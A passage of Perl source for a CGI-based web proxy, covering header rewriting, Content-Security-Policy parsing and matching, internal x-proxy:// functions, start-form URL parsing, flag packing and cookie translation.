    setsid() || die "setsid: $!"  unless $^O=~ /win/i ;

    # Fork again to guarantee no controlling terminal.
    $pid= fork() ; 
    die "fork: $!"  unless defined($pid) ;

    # Send the PID to the parent process.
    print $PIPE_C "$pid\n" if $pid;
    close($PIPE_C) ;

    # Exit second parent process.
    exit(0) if $pid ;

    # Second child process continues.  This is the daemon process.

    return 0 ;
}




sub http_fix {
    my($name, $value, $new_value) ;
    my $has_blank_line= $headers=~ s/\015?\012\015?\012\z/\015\012/ ;
    my(@headers)= $headers=~ /^([^\012]*\012?)/mg ;  # split into lines

    foreach (@headers) {
	next unless ($name, $value)= /^([\w.-]+):\s*([^\015\012]*)/ ;
	$new_value= &new_header_value($name, $value) ;
	$_= defined($new_value)
	    ? "$name: $new_value\015\012"
	    : '' ;
    }

    # Add our CSP header-- one for the whole message, plus one for each incoming
    #   CSP header consisting of its unchanged parts only.  Data from all incoming CSP
    #   headers is stored in $csp.
    # These wouldn't be safe, except that we enforce the directives elsewhere.
    # Note that browsers as of 12-2013 only support CSP 1.0, which doesn't allow
    #   paths in source expressions, so we have to use the second (imperfect)
    #   header below.  When browsers support CSP 1.1, we'll put the better
    #   version back in.
    # jsm-- should allow data: in various directives where incoming CSP allows it
#    unshift(@headers, "Content-Security-Policy: default-src $THIS_SCRIPT_URL/ 'unsafe-inline' 'unsafe-eval' ; img-src $THIS_SCRIPT_URL/ data: ; form-action $THIS_SCRIPT_URL/ ; base-uri $THIS_SCRIPT_URL/\015\012") ;
    my $csp_source= $RUNNING_ON_SSL_SERVER
	? 'https://' . $THIS_HOST . ($ENV_SERVER_PORT==443  ? ''  : ':' . $ENV_SERVER_PORT)
	: 'http://'  . $THIS_HOST . ($ENV_SERVER_PORT==80   ? ''  : ':' . $ENV_SERVER_PORT) ;
    unshift(@headers, "Content-Security-Policy: default-src $csp_source 'unsafe-inline' 'unsafe-eval' ; img-src $csp_source data:\015\012") ;

    # Don't support non-standard CSP headers (used in old browser versions) for now.
#    push(@headers, "X-Content-Security-Policy: $csp_out\015\012") ;
#    push(@headers, "X-Webkit-CSP: $csp_out\015\012") ;

    # To make traffic fingerprinting harder.
    shuffle(\@headers) ;

    $headers= join('', @headers, $has_blank_line  ? "\015\012"  : () ) ;
}


# Returns the value of an updated header, e.g. with URLs transformed to point
#   back through this proxy.  Returns undef if the header should be removed.
# This is used to translate both real headers and <meta http-equiv> headers.
# Special case for URI: and Link: -- these headers can be lists of values
#   (see the HTTP spec, and comments above in http_fix()).  Thus, we must
#   process these headers as lists, i.e. transform each URL in the header.
sub new_header_value {
    my($name, $value, $is_meta_tag)= @_ ;
    $name= lc($name) ;

    # sanity check
    return undef if $name eq '' ;

    # These headers consist simply of a URL.
    # Note that all these are absolute URIs, except possibly Content-Location:,
    #   which may be relative to Content-Base or the request URI-- notably, NOT
    #   relative to anything in the content, like a <base> tag.
    return &full_url($value)
	if    $name eq 'content-base'
	   || $name eq 'content-location' ;

    # Location: header should carry forward the expected type, since some sites
    #   (e.g.. hotmail) may 302 forward to another URL and use the wrong
    #   Content-Type:, and that retrieved resource may still be treated by the
    #   browser as of the expected type.  Here we just carry forward the entire
    #   flag segment.
    if ($name eq 'location') {
	local($url_start)= $script_url . '/' . $lang . '/' . $packed_flags . '/' ;
	return &full_url($value) ;
    }

    if ($name eq 'set-cookie') {
	return undef if $cookies_are_banned_here ;
	if ($NO_COOKIE_WITH_IMAGE || $e_filter_ads) {
	    return undef
		if ($headers=~ m#^Content-Type:\s*(\S*)#mi  &&  $1!~ m#^text/#i)
		   || ! grep(m#^(text|\*)/#i, split(/\s*,\s*/, $env_accept)) ;
	}

	return &cookie_to_client($value, $path, $host) ;
    }


    # Extract $default_style_type as needed.
    # Strictly speaking, a MIME type is "token/token", where token is
    #    ([^\x00-\x20\x7f-\xff()<>@,;:\\"/[\]?=]+)   (RFCs 1521 and 822),
    #   but this below covers all existing and likely future MIME types.
    if ($name eq 'content-style-type') {
	$default_style_type= lc($1)  if $value=~ m#^\s*([/\w.+\$-]+)# ;
	return $value ;
    }


    # Extract $default_script_type as needed.
    # Same deal about "token/token" as above.
    if ($name eq 'content-script-type') {
	$default_script_type= lc($1)  if $value=~ m#^\s*([/\w.+\$-]+)# ;
	return $value ;
    }


    # Handle P3P: header.  P3P info may also exist in a <link> tag (or
    #   conceivably a Link: header), but those are already handled correctly
    #   where <link> tags (or Link: headers) are handled.
    if ($name eq 'p3p') {
	$value=~ s/\bpolicyref\s*=\s*['"]?([^'"\s]*)['"]?/
		   'policyref="' . &full_url($1) . '"' /gie ;
	return $value ;
    }


    # And the non-standard Refresh: header... any others?
    $value=~ s/(;\s*URL\s*=)\s*((?>['"]?))(\S*)\2/ $1 . &full_url($3) /ie,   return $value
	if $name eq 'refresh' ;

    # The deprecated URI: header may contain several URI's, inside <> brackets.
    $value=~ s/<(\s*[^>\015\012]*)>/ '<'.&full_url($1).'>' /gie, return $value
	if $name eq 'uri' ;


    if ($name eq 'link') {
	my($v, @new_values) ;

	my(@values)= $value=~ /(<[^>]*?>[^,]*)/g ;
	foreach $v (@values) {
	    my($type)= $v=~ m#[^\w.\/?&-]type\s*=\s*["']?\s*([/\w.+\$-]+)#i ;
	    $type= lc($type) ;

	    my($rel) ;
	    $rel= $+  if $v=~ /[^\w.\/?&-]rel\s*=\s*("([^"]*)"|'([^']*)'|([^'"][^\s]*))/i ;

	    $type= 'text/css' if $type eq '' and $rel=~ /\bstylesheet\b/i ;

	    return undef
		if $scripts_are_banned_here && $type=~ /^$SCRIPT_TYPE_REGEX$/io ;

	    local($url_start)= $url_start ;
	    $url_start= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
					   $e_hide_referer, $e_insert_entry_form,
					   $is_in_frame, $type)
		if $type ne '' ;

	    if ($rel=~ /\bstylesheet\b/i) {
		$v=~ s/<(\s*[^>\015\012]*)>/ '<' . (match_csp_source_list('style-src', $1)
						    ? &full_url($1)  : '') . '>' /gie ;
	    } elsif (lc($rel) eq 'icon') {
		$v=~ s/<(\s*[^>\015\012]*)>/ '<' . (match_csp_source_list('img-src', $1)
						    ? &full_url($1)  : '') . '>' /gie ;
	    } else {
		$v=~ s/<(\s*[^>\015\012]*)>/ '<' . &full_url($1) . '>' /gie ;
	    }

	    push(@new_values, $v) ;
	}

	return join(', ', @new_values) ;
    }


    if ($name eq 'content-security-policy') {
	return undef unless $csp_is_supported ;
	return undef if $is_meta_tag and $csp ;   # reject if CSP already exists (CSP spec, section 3.1.3)
	return parse_csp_header($value) ;
    }

    if ($name eq 'content-security-policy-report-only') {
return undef ;   # we don't support this header yet
	return undef if $is_meta_tag and $csp_ro ;
	($csp_ro, $value)= parse_csp_header($csp_ro, $value) ;   # note this is no longer correct
	return $value ;
    }

    # For now, we don't support non-standard CSP headers, used in earlier browser versions.
    return undef  if $name eq 'x-webkit-csp' or $name eq 'x-content-security-policy' ;

    # Ideally we'd support other values, but at least use this to prevent some
    #   non-proxied pages.
    if ($name eq 'x-frame-options') {
	return 'SAMEORIGIN' ;
    }


    # Support CORS headers.
    # This one is probably unnecessary, since browser won't do CORS requests,
    #   it just requests the server-side script to do them.
    if ($name eq 'access-control-allow-origin') {
	my $hostst= $host=~ /:/  ? "[$host]"  : $host ;
	return "$scheme://$hostst" . ($scheme eq 'http'  ? ($port==80  ? '' : ":$port")
				  : $scheme eq 'https' ? ($port==443 ? '' : ":$port")
				  :                       ":$port") ;
    }


    # For all non-special headers, return $value
    return $value ;
}



sub parse_csp_header {
    my($value)= @_ ;
    my $directive ;

    # Build $new_policy from $value .
    my $new_policy= {} ;
    foreach $directive (split(/;/, $value)) {
	my($dname, $dvalue)= split(' ', $directive, 2) ;
	$dname= lc($dname) ;
	next if $dname eq 'report-uri' ;  # for now, we don't support reporting
	next if $new_policy->{$dname} ;   # as per section 3.2.1.1, rule 2.5

	$new_policy->{$dname}= [ split(' ', $dvalue) ] ;
    }

    if ($new_policy->{'default-src'}) {
	$new_policy->{$_}||= $new_policy->{'default-src'}
	    foreach qw(script-src object-src style-src img-src media-src frame-src font-src connect-src) ;
	delete $new_policy->{'default-src'} ;
    }

    # Merge $new_policy into $csp .  Note that each directive may happen
    #   multiple times in multiple headers, but not within the same one.  All
    #   instances of a directive must be satisfied.
    foreach $directive (keys %$new_policy) {
	$csp->{$directive}= []  unless $csp->{$directive} ;
	push(@{$csp->{$directive}}, $new_policy->{$directive}) ;
    }

    # Return the unchanging parts of this header (the non-source-list directives).
    # All CSP source lists are collapsed to "$THIS_SCRIPT_URL/" in http_fix(),
    #   and the other directive types are passed through unchanged here.
    return join('; ', map {"$_ @{$new_policy->{$_}}"}
			  grep {$new_policy->{$_}}
			       qw(sandbox plugin-types referrer reflected-xss) ) ;
}


sub match_csp_source_list {
    my($directive_name, $uri, $nonce, $pr_uri)= @_ ;
    my($match) ;
    return 1 unless $csp_is_supported ;

    return 1 unless defined($uri) and defined($csp->{$directive_name}) ;

    $pr_uri= $URL unless defined $pr_uri ;
    $nonce=~ s/^\s+|\s+$//g  if defined $nonce ;

    # For "'unsafe-inline'" or "'unsafe-eval'", verify it's in each directive.
    if ($uri eq "'unsafe-inline'" or $uri eq "'unsafe-eval'") {
	foreach my $directive (@{$csp->{$directive_name}}) {
	    $match= 0 ;
	    foreach my $source (@$directive) {
		$match= 1, last  if $source eq $uri ;
		$match= 1, last  if defined $nonce and $source eq "'nonce-$nonce'" ;
	    }
	    return 0  unless $match ;
	}
	return 1 ;
    }

    # Otherwise, parse $uri and set defaults.
    $uri= absolute_url($uri) ;    # inefficient....
    my($uscheme, $uauthority, $upath)= $uri=~ m#^([\w+.-]+:)//([^/?]*)([^?]*)# ;
    $uscheme= lc($uscheme) ;
    my($uhost, $uport)= $uauthority=~ /\[/
	    ? $uauthority=~ /^(?:.*?@)?\[([^\]]*)\]:?(.*)$/                     # IPv6
	    : $uauthority=~ /^(?:.*?@)?([^:]*):?(.*)$/ ;
    $uhost= lc($uhost) ;
    $uport||= ($uscheme eq 'http:')  ? 80  : ($uscheme eq 'https:')  ? 443  : undef ;
    $upath=~ s/%([\da-fA-F]{2})/ chr(hex($1)) /ge ;        # also rule 3.2
    $upath= "/$upath" if $upath!~ m#^/# ;   # if path is '' or contains only query (rule 3.2)

    foreach my $directive (@{$csp->{$directive_name}}) {
	$match= 0 ;
	foreach my $source (@$directive) {
	    return 0  if $source eq "'none'" ;

	    $match= 1, last  if defined $nonce and $source eq "'nonce-$nonce'" ;

	    $match= 1, last  if $source eq '*' ;           # rule 2

	    # If matches scheme-source...
	    if ($source=~ /^[\w+.-]+:$/) {
		$match= 1, last if $source eq $uscheme ;   # rule 3.1
		next ;                                     # rule 3.2

	    # ... elsif matches host-source...
	   } elsif ($source!~ /^'/) {
		next unless $uhost ;                       # rule 4.1

		# Parse $uri and set defaults.
		my($sscheme, $sauthority, $spath)= $source=~ m#^(?:([\w+.-]+:)//)?([^/?]*)([^?]*)# ;
		$sscheme= lc($sscheme) ;
		next if $sscheme and $sscheme ne $uscheme ;         # rule 4.3
		if (!$sscheme) {
		    next if $pr_uri=~ /^http:/i and $uscheme ne 'http:' and $uscheme ne 'https:' ;  # rule 4.4.1
		    next if $pr_uri!~ /^http:/i and $pr_uri!~ /^$uscheme/i ;  # rule 4.4.2
		}

		my($shost, $sport)= $sauthority=~ /\[/
		    ? $sauthority=~ /^(?:.*?@)?\[([^\]]*)\]:?(.*)$/                     # IPv6
		    : $sauthority=~ /^(?:.*?@)?([^:]*):?(.*)$/ ;
		$shost= lc($shost) ;
		my $hsuffix ;
		next if ($hsuffix)= $shost=~ /^\*(\..*)/ and $uhost!~ /\Q$hsuffix\E$/ ;  # rule 4.5
		next if $shost!~ /^\*(\..*)/ and $uhost ne $shost ;             # rule 4.6, corrected
		next if $sport eq '' and $uport != (($uscheme eq 'http:')  ? 80  : ($uscheme eq 'https:')  ? 443  : -1) ;
							   # rule 4.7
		next if $sport ne '' and $sport ne '*' and $sport!=$uport ;     # rule 4.8

		$spath=~ s/%([\da-fA-F]{2})/ chr(hex($1)) /ge ;                 # rule 4.9.1
		next if $spath and $spath=~ m#/$# and !($upath=~ /^$spath/) ;   # rule 4.9.2
		next if $spath and $spath!~ m#/$# and $spath ne $upath ;        # rule 4.9.3
		$match= 1, last ;

	    } elsif ($source eq "'self'") {
		my($pscheme, $pauthority, $ppath)= $pr_uri=~ m#^(?:([\w+.-]+:)//)?([^/?]*)([^?]*)# ;
		$pscheme= lc($pscheme) ;
		my($phost, $pport)= $pauthority=~ /\[/
		    ? $pauthority=~ /^(?:.*?@)?\[([^\]]*)\]:?(.*)$/                     # IPv6
		    : $pauthority=~ /^(?:.*?@)?([^:]*):?(.*)$/ ;
		$phost= lc($phost) ;
		$pport||= ($pscheme eq 'http:')  ? 80  : ($pscheme eq 'https:')  ? 443  : undef ;

		$match= 1, last  if $uscheme eq $pscheme and $uhost eq $phost and $uport==$pport ;   # rule 5.1

		# don't support blob: schemes yet (rule 5.2)
	    }
	    # rule 6 would be "next" here but is implied 
	}

	# This directive wasn't satisfied.
	return 0  unless $match ;
    }

    # All the directives were satisfied.
    return 1 ;
}



sub csp_is_supported {
    return $1>=25  if $ENV{HTTP_USER_AGENT}=~ /\bChrome\/(\d+)/ ;
    return $1>=23  if $ENV{HTTP_USER_AGENT}=~ /\bFirefox\/(\d+)/ ;

    return 0 ;
}



sub xproxy {
    my($xURL)= @_ ;
    $xURL=~ s/^x-proxy://i ;

    # $qs will contain the query string in $xURL, whether it was encoded with
    #   the URL or came from QUERY_STRING.
    my($family, $function, $qs)=  $xURL=~ m#^//(\w+)(/?[^?]*)\??(.*)#i ;

    if ($family eq 'auth') {

	# For //auth/make_auth_cookie, return an auth cookie and redirect user
	#   to the desired URL.  The URL is already encoded in $in{'l'}.
	if ($function eq '/make_auth_cookie') {
	    my(%in)= &getformvars() ; # must use () or will pass current @_!
	    my($location)= $url_start . $in{'l'} ;  # was already encoded
	    my($cookie)= &auth_cookie(@in{'u', 'p', 'r', 's'}) ;

	    &redirect_to($location, "Set-Cookie: $cookie\015\012") ;
	}


    } elsif ($family eq 'start') {
	&startproxy ;


    } elsif ($family eq 'cookies') {

	# Store in the database a cookie sent encoded in the query string.
	if ($function eq '/set-cookie') {
	    # This does checks, then stores cookie in database.
	    my($origin, $enc_cookie)= split(/&/, $qs, 2) ;
	    &cookie_to_client(cookie_decode($enc_cookie), $path, $origin)  if $USE_DB_FOR_COOKIES ;
	    print $STDOUT "$HTTP_1_X 204 No Content\015\012",
			  "Cache-Control: no-cache\015\012",
			  "Pragma: no-cache\015\012\015\012" ;
	    if ($RUN_METHOD eq 'embedded') {
		die 'exiting' ;
	    } else {
		goto ONE_RUN_EXIT ;
	    }


	# If pages could link to x-proxy:// URLs directly, this would be a
	#   security hole in that malicious pages could clear or update one's
	#   cookies.  But full_url() prevents that.  If that changes, then we
	#   should consider requiring POST in /cookie/clear and /cookie/update
	#   to minimize this risk.
	} elsif ($function eq '/clear') {
	    my($location)=
		$url_start . &wrap_proxy_encode('x-proxy://cookies/manage') ;
	    $location.= '?' . $qs    if $qs ne '' ;

	    if ($USE_DB_FOR_COOKIES) {
		&delete_all_cookies_from_db() ;
		&redirect_to($location) ;
	    } else {
		&redirect_to($location, &cookie_clearer($ENV{'HTTP_COOKIE'})) ;
	    }


	} elsif ($function eq '/manage') {
	    &manage_cookies($qs) ;


	# For //cookies/update, clear selected cookies and go to manage screen.
	} elsif ($function eq '/update') {
	    my(%in)= &getformvars() ; # must use () or will pass current @_!
	    my($location)=
		$url_start . &wrap_proxy_encode('x-proxy://cookies/manage') ;

	    # Add encoded "from" parameter to URL if available.
	    if ($in{'from'} ne '') {
		my($from_param)= $in{'from'} ;
		$from_param=~ s/([^\w.-])/ '%' . sprintf('%02x',ord($1)) /ge ;
		$location.=  '?from=' . $from_param ;
	    }

	    # "delete=" input fields are in form &base64(&cookie_encode($name)).
	    my(@cookies_to_delete)= map {&unbase64($_)} split(/\0/, $in{'delete'}) ;

	    if ($USE_DB_FOR_COOKIES) {
		&delete_cookies_from_db(@cookies_to_delete) ;
		&redirect_to($location) ;
	    } else {
		&redirect_to($location, &cookie_clearer(@cookies_to_delete)) ;
	    }
	}


    } elsif ($family eq 'frames') {
	my(%in)= &getformvars($qs) ;

	# Send the top proxy frame when a framed page is reframed.
	if ($function eq '/topframe') {
	    &return_top_frame($in{'URL'}) ;

	# Not currently used
	} elsif ($function eq '/framethis') {
	    &return_frame_doc($in{'URL'}, &HTMLescape(&wrap_proxy_decode($in{'URL'}))) ;
	}


    } elsif ($family eq 'scripts') {

	# Return the library needed for JavaScript rewriting.  Normally, this
	#   can be cached.
	if ($function eq '/jslib') {
	    &return_jslib ;
	}


    } elsif ($family eq 'xhr') {
	# Kind of hacky, but we need to pass XHR origin somehow-- use an x-proxy: URL.
	# Format of URL is x-proxy://xhr/url-encoded-origin/header1:header2:.../omit-credentials/scheme/rest-of-URL
	(undef, $xhr_origin, $xhr_headers, $xhr_omit_credentials, $URL)= split(/\//, $function, 5) ;
	$xhr_origin=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	@xhr_headers= grep { /\S/ } split(/:/, $xhr_headers) ;
	$URL=~ s#/#://# ;
	$URL.= "?$qs"  if $qs ne '' ;

	# Decode and parse URL again.
	($scheme, $authority, $path)= ($URL=~ m#^([\w+.-]+)://([^/?]*)(.*)$#i) ;
	$scheme= lc($scheme) ;
	$path= "/$path" if $path!~ m#^/# ;   # if path is '' or contains only query

	return ;
    }


warn "no such function as x-proxy://$family$function\n" ;
    &HTMLdie(['Sorry, no such function as //%s', &HTMLescape("$family$function.")],
	     '', '404 Not Found') ;

}


sub return_flash_vars {
    my($s)= @_ ;
    my($len)= length($s) ;
    my($date_header)= &rfc1123_date($now, 0) ;
warn "in return_flash_vars($s)" ;                   # this indicates success...  :?

    print $STDOUT <<EOF . $s ;
$HTTP_1_X 200 OK
$session_cookies${NO_CACHE_HEADERS}Date: $date_header
Content-Type: application/x-www-form-urlencoded
Content-Length: $len

EOF

    die "exiting" ;
}


sub startproxy {
    my(%in)= &getformvars() ;  # must use () or will pass current @_!


    # Decode URL if it was encoded before transmission.
    # Chrome chokes on some chars here, and other browsers choke on others.  :P
    my $encode_prefix= $ENV{HTTP_USER_AGENT}=~ /Chrome|Safari/  ? "\x7f"  : "\x01" ;
    $in{'URL'}= &wrap_proxy_decode($in{'URL'})
	if $ENCODE_URL_INPUT && $in{'URL'}=~ s/^$encode_prefix+// ;

    $in{'URL'}=~ s/^\s+|\s+$//g ;    # strip leading or trailing spaces

    &show_start_form('Enter the URL you wish to visit in the box below.')
	if $in{'URL'} eq '' or $in{'URL'}=~ /[\0\x0d\x0a]/ ;   # protect against HTTP header injection

    # Handle (badly) the special case of "mailto:" URLs, which don't have "://".
    &unsupported_warning($in{URL}) if $in{URL}=~ /^mailto:/i ;

    # Parse input URI into components, using a regex similar to this one in
    #   RFC 2396:  ^(([^:/?#]+):)?(//([^/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?
    # Here, $query and $fragment include their initial "?" and "#"  chars,
    #   and $scheme is undefined if there's no "://" .
    my($scheme, $authority, $path, $query, $fragment)=
	$in{URL}=~ m{^(?:([^:/?#]+)://)?([^/?#]*)([^?#]*)(\?[^#]*)?(#.*)?$} ;
    $scheme= lc($scheme) ;
    $path= '/' if $path eq '' ;

    # Parse $authority into username/password, hostname, and port-string.
    my($auth, $host, $portst)= $authority=~ /\[/
	? $authority=~ /^([^@]*@)?(?:\[([^\]]*)\])(:[^@]*)?$/
	: $authority=~ /^([^@]*@)?([^:@]*)(:[^@]*)?$/ ;

    &show_start_form('The URL you entered has an invalid host name.', $in{URL})
	if !defined($host) ;

    $host= lc($host) ;   # must be after testing defined().

    &show_start_form('The URL must contain a valid host name.', $in{URL})
	if $host eq '' ;

    # Scheme defaults to FTP if host begins with "ftp.", else to HTTP.
    $scheme= ($host=~ /^ftp\./i)  ? 'ftp'  : 'http'   if $scheme eq '' ;

    &show_start_form('Sorry, only HTTP and FTP are currently supported.', $in{URL})
	unless $scheme=~ /^(http|https|ftp|x-proxy)$/ ;

    # Convert integer hostnames like 3467251275 to a.b.c.d format.
    # This is for big-endian; reverse the list for little-endian.
    $host= join('.', $host>>24 & 255, $host>>16 & 255, $host>>8 & 255, $host & 255)
	if $host=~ /^\d+$/ ;

    # Allow shorthand for hostnames-- if no "." is in it, then add "www"+"com"
    #   or "ftp"+"com".  Don't do it if the host already exists on the LAN.
    if ($scheme eq 'http') {
	$host= "www.$host.com"  if $host!~ /\./ and $host!~ /\:/ and !gethostbyname($host) ;
    } elsif ($scheme eq 'ftp') {
	# If there's username/password embedded (which you REALLY shouldn't do),
	#   then don't risk sending that to an unintended host.
	$host= "ftp.$host.com"
	    if $auth eq '' and $host!~ /\./ and $host!~ /\:/ and !gethostbyname($host) ;
    }

    # Force $portst to ":" followed by digits, or ''.
    ($portst)= $portst=~ /^(:\d+)/ ;

    my $hostst= $host=~ /:/  ? "[$host]"  : $host ;
    # Reassemble $authority after all changes are complete.
    $authority= $auth . $hostst . $portst ;

    # Prepend flag segment of PATH_INFO
    # This "erroneously" sets flags to "000000" when user config is not
    #   allowed, but it doesn't really affect anything.
    $url_start=~ s#[^/]*/$## ;   # remove old flag segment from $url_start
    $url_start.= &pack_flags(@in{'rc', 'rs', 'fa', 'br', 'if'}, $is_in_frame, '') . '/' ;

    &redirect_to( $url_start . &wrap_proxy_encode("$scheme://$authority$path$query") . $fragment ) ;
}


sub pack_flags {
    my($remove_cookies, $remove_scripts, $filter_ads, $hide_referer,
	  $insert_entry_form, $is_in_frame, $expected_type)= @_ ;

    my $total= !!$remove_cookies    *32
	     + !!$remove_scripts    *16
	     + !!$filter_ads        *8
	     + !!$hide_referer      *4
	     + !!$insert_entry_form *2
	     + !!$is_in_frame ;

    my $ret= chr($total).chr($MIME_TYPE_ID{lc($expected_type)}) ;
    $ret=~ tr/\x00-\x3f/0-9A-Za-z\-_/ ;

    return $ret ;
}


sub unpack_flags {
    my($flags)= @_ ;
    my($remove_cookies, $remove_scripts, $filter_ads, $hide_referer,
       $insert_entry_form, $is_in_frame, $expected_type) ;

    $flags=~ tr/0-9A-Za-z\-_/\x00-\x3f/ ;
    ($flags, $expected_type)= map {ord} split(//, $flags) ;

    $remove_cookies=    ($flags & 32) ? 1 : 0 ;
    $remove_scripts=    ($flags & 16) ? 1 : 0 ;
    $filter_ads=        ($flags & 8)  ? 1 : 0 ;
    $hide_referer=      ($flags & 4)  ? 1 : 0 ;
    $insert_entry_form= ($flags & 2)  ? 1 : 0 ;
    $is_in_frame=       ($flags & 1)  ? 1 : 0 ;

    # Extract expected MIME type from final one-character flag
    $expected_type= $ALL_TYPES[$expected_type] ;

    return ($remove_cookies, $remove_scripts, $filter_ads, $hide_referer,
	    $insert_entry_form, $is_in_frame, $expected_type) ;
}


sub url_start_by_flags {
    return "$script_url/$lang/" . &pack_flags(@_) . '/' ;
}

sub parse_cookie {
    my($cookie, $target_path, $target_server, $target_port, $target_scheme)= @_ ;
    my($name, $value, $type, $subtype, @n,
       $cname, $path, $domain, $cvalue, $secure, @matches, %pathlen,
       $realm, $server, @auth) ;

    foreach ( split(/\s*;\s*/, $cookie) ) {
	($name, $value)= split(/=/, $_, 2) ;     # $value may contain "="

	# Set $session_id and $session_id_persistent from S and S2 cookies.
	if ($USE_DB_FOR_COOKIES) {
	    $session_id= $value, next  if $name eq 'S' ;
	    $session_id_persistent= $value, next  if $name eq 'S2' ;
	}

	$name= &cookie_decode($name) ;
	$value= &cookie_decode($value) ;
	($type, @n)= split(/;/, $name) ;
	if ($type eq 'COOKIE') {
	    ($cname, $path, $domain)= @n ;
	    $domain= lc($domain) ;
	    ($cvalue, $secure)= split(/;/, $value) ;
	    next if $secure && ($target_scheme ne 'https') ;

	    # According to the cookie spec, a cookie domain equal to a "."
	    #   plus the target domain should not match, but browsers treat
	    #   it as if it does, so we do the same here.
	    if ( ($target_server=~ /\Q$domain\E$/i or (lc('.'.$target_server) eq lc($domain)) )
		 && $target_path=~ /^\Q$path\E/ )
	    {
		# Cookies are always supposed to have a name, but some servers
		#   don't follow this, and at least one browser treats it as
		#   cookie with only "value" instead of "name=value".  So,
		#   we follow that here, for these errant cookies.
		push(@matches, ($cname ne '' ? $cname.'='.$cvalue : $cvalue)) ;
		$pathlen{$matches[$#matches]}= length($path) ;
	    }
	} elsif ($type eq 'AUTH') {
	    # format of auth cookie's name is AUTH;$enc_realm;$enc_server
	    ($realm, $server)= @n ;
	    $realm=~  s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	    $server=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;
	    my($portst)= ($target_port eq '')  ? ''  : ":$target_port" ;
	    push(@auth, $realm, $value)
		if  $server eq "$target_server$portst" ;
	}
    }

    # More specific path mappings (i.e. longer paths) should be sent first.
    $cookie= join('; ', sort { $pathlen{$b} <=> $pathlen{$a} } @matches) ;

    return $cookie, @auth ;
}



sub cookie_to_client {
    my($cookie, $source_path, $origin)= @_ ;
    my($name, $value, $expires_clause, $path, $domain, $secure_clause, $httponly_clause) ;
    my($new_name, $new_value, $new_cookie) ;

    my($origin_host)= $origin=~ /\[/
	? $origin=~ m#^(?:\w+://)?\[([^\]]+)\]#             # IPv6
	: $origin=~ m#^(?:\w+://)?([^/:]+)# ;

    # Start last four regexes with ";" to avoid extracting from name=value.
    # Cookie values aren't supposed to have commas, per the spec, but at least
    #   one site (go.com, using the Barista server) violates this.  So for now,
    #   allow commas in $value.
    # Cookie values aren't supposed to have spaces, either, but some sites
    #   have spaces in cookie values.  Thus, we allow spaces too.  :P
    #($name, $value)=   $cookie=~ /^\s*([^=;,\s]*)\s*=?\s*([^;,\s]*)/ ;
    ($name, $value)=   $cookie=~ /^\s*([^=;,\s]*)\s*=?\s*([^;]*)/ ;
    ($expires_clause)= $cookie=~ /;\s*(expires\s*=[^;]*)/i ;
    ($path)=           $cookie=~ /;\s*path\s*=\s*([^;,\s]*)/i ;  # clash w/ ;-params?
    ($domain)=         $cookie=~ /;\s*domain\s*=\s*([^;,\s]*)/i ;
    ($secure_clause)=  $cookie=~ /;\s*(secure\b)/i ;
    ($httponly_clause)=  $cookie=~ /;\s*(HttpOnly\b)/i ;

    # Path defaults to either the path of the URL that sent the cookie, or '/'.
    #   See comments above $COOKIE_PATH_FOLLOWS_SPEC for more details.
    $path=  $COOKIE_PATH_FOLLOWS_SPEC  ? $source_path  : '/'  if $path eq '' ;

    if ($domain eq '') {
	$domain= $origin_host ;
    } else {
	$domain=~ s/\.*$//g ;  # removes trailing dots!
	$domain=~ tr/././s ;   # ... and double dots for good measure.
	# Allow $domain to match domain-minus-leading-dot (erroneously),
	#   because that's how browsers do it.
	return undef
	    if ($origin_host!~ /\Q$domain\E$/) and ('.'.$origin_host ne $domain) ;
	if ($RESPECT_THREE_DOT_RULE) {
	    return(undef) unless
		( ( ($domain=~ tr/././) >= 3 ) ||
		  ( ($domain=~ tr/././) >= 2 &&
		    $domain=~ /\.(com|edu|net|org|gov|mil|int)$/i )
		) ;
	} else {
	    if (($domain=~ tr/././) < 2) {
		return undef  if $domain=~ /^\./ ;
		$domain= '.' . $domain ;
		return undef  if ($domain=~ tr/././) < 2 ;
	    }
	}
    }


    # Change $expires_clause to make it a session cookie if so configured.
    # Don't do so if the cookie expires in the past, which means a deleted cookie.
    if ($SESSION_COOKIES_ONLY and $expires_clause ne '') {
	my($expires_date)= $expires_clause=~ /^expires\s*=\s*(.*)$/i ;
	$expires_clause= ''  if &date_is_after($expires_date, $now) ;
    }


    # If we're using a server-side database to store cookies, then store it and
    #   return undef to clear the existing Set-Cookie: header.
    if ($USE_DB_FOR_COOKIES) {
	store_cookie_in_db($name, $value, $expires_clause, $path, $domain, $secure_clause, $httponly_clause) ;
	return undef ;
    }


    # This is hereby the transformed format: name is COOKIE;$name;$path;$domain
    #   (the three values won't already have semicolons in them); value is
    #   $value;$secure_clause .  Both name and value are then cookie_encode()'d.
    #   The name contains everything that identifies the cookie, and the value
    #   contains all info we might care about later.
    $new_name= &cookie_encode("COOKIE;$name;$path;$domain") ;

    # New value is "$value;$secure_clause", then cookie_encode()'d.
    $new_value= &cookie_encode("$value;$secure_clause") ;


    # Create the new cookie from its components, removing the empty ones.
    # The new domain is this proxy server, which is the default if it is not
    #   specified.
    $new_cookie= join('; ', grep(length,
				 $new_name . '=' . $new_value,
				 $expires_clause,
				 'path=' . $ENV_SCRIPT_NAME . '/',
				 ($RUNNING_ON_SSL_SERVER ? ('secure') : () ),
				 $httponly_clause
		     )) ;
    return $new_cookie ;

}


sub auth_cookie {
    my($username, $password, $realm, $server)= @_ ;

    $realm=~ s/(\W)/ '%' . sprintf('%02x',ord($1)) /ge ;
    $server=~ s/(\W)/ '%' . sprintf('%02x',ord($1)) /ge ;

    return join('', &cookie_encode("AUTH;$realm;$server"), '=',
		    &cookie_encode(&base64("$username:$password")),
		    '; path=' . $ENV_SCRIPT_NAME . '/',
		    ($RUNNING_ON_SSL_SERVER ? '; secure' : '' ),
		    '; HttpOnly') ;
}



sub cookie_clearer {
    my(@cookies)= @_ ;   # may be one or more lists of cookies
    my($ret, $cname) ;

    foreach (@cookies) {
	foreach $cname ( split(/\s*;\s*/) ) {
	    $cname=~ s/=.*// ;      # change "name=value" to "name"
	    $ret.= "Set-Cookie: $cname=; expires=Thu, 01-Jan-1970 00:00:01 GMT; "
		 . "path=$ENV_SCRIPT_NAME/\015\012" ;
	}
    }
    return $ret ;
}


# Reads $session_id and $session_id_persistent from HTTP_COOKIE .
sub get_session_cookies {
    my($name, $value) ;

